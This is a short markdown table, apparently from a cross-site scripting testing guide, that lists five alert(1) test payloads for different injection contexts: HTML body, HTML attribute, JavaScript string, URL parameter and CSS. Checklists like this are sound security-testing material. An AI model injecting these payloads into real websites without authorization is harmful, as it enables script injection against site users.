## 📋 Context-Based Testing

| Context | Test Payload |
|---------|-------------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `" onmouseover="alert(1)` |
| JavaScript string | `';alert(1)//` |
| URL parameter | `javascript:alert(1)` |
| CSS | `expression(alert(1))` |

